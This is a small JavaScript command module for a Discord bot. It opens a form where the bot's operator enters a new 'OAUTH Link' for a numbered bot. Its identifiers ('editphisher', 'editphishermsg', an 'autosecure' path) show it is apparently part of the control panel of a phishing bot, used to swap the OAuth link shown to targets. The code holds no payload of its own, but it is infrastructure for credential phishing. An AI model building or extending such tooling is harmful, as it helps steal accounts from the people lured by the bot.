const ModalBuilder = require('../../utils/modalBuilder')
const editphishermsg = require("../../../autosecure/utils/responses/editphishermsg");
const { TextInputStyle } = require("discord.js");


module.exports = {
    name: "changeoauth",
    editphisher: true,
    callback: async (client, interaction) => {
        let [t, botnumber, ownerid] = interaction.customId.split("|")
        return interaction.showModal(ModalBuilder(`changeoauthmodal|${botnumber}|${ownerid}`, `OAUTH Link`, [{
            setCustomId: 'oauthlink',
            setMaxLength: 4000,
            setMinLength: 0,
            setRequired: false,
            setLabel: "OAUTH Link",
            setPlaceholder: "Type the desired OAUTH Link.",
            setStyle: TextInputStyle.Short
        }]))
    }
}
